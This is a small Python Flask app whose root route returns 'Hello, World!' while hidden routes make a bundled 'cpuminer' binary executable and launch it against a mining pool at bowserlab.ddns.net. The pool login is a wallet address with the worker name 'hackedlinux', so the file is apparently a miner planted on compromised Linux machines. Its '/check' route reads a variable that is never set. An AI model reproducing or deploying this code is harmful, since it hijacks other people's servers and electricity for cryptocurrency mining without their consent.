import subprocess
from flask import Flask
app = Flask(__name__)

runtime=None

@app.route('/')
def hello_world():
    return 'Hello, World!'

@app.route('/run1')
def run():
    result = subprocess.run(["chmod" ,"+x", "./cpuminer"], stdout=subprocess.PIPE)
    return result.stdout

@app.route('/run2')
def run2():
    runtime = subprocess.run(["./cpuminer", "-a", "m7m" ,"-o" ,"stratum+tcp://bowserlab.ddns.net:6033" ,"-u" ,"9HuMXoLqu8FsSBfk9fNEKGh88z2fddkpwi.hackedlinux", "-p", "c=XMG"], stdout=subprocess.PIPE)
    return "ok"

@app.route('/check')
def check():
    return runtime.stdout